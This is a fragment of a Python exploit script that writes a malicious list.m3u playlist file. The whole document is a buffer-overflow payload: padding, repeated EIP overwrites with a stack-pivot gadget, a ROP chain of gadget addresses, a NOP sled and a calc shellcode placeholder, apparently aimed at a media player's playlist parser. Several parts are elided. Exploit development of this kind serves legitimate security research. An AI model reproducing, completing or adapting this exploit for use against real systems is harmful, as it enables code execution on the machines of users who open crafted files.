...
def create_rop_chain():
	...
	rop_gadgets = [
	  ...
	  0x10025a1c,  # Filler (compensate)
	  0x10025a1c,  # Filler (compensate)
	  0x10025a1c,  # Filler (compensate) 0x01ccf23a
...
eip = b'\x85\x22\x01\x10' # {pivot 8 / 0x08} :  # ADD ESP,8 # RETN
...
shell = b"\x90"*0x10 + calc

#exploit = junk + eip + rop + shell + 'C' * (1000-len(rop)-len(shell))

filename = "list.m3u"
textfile = open(filename , 'wb')
textfile.write(junk + eip + eip + eip + eip + eip)
textfile.write(rop)
textfile.write(shell + b'C' * (1000-len(rop)-len(shell)))
textfile.close()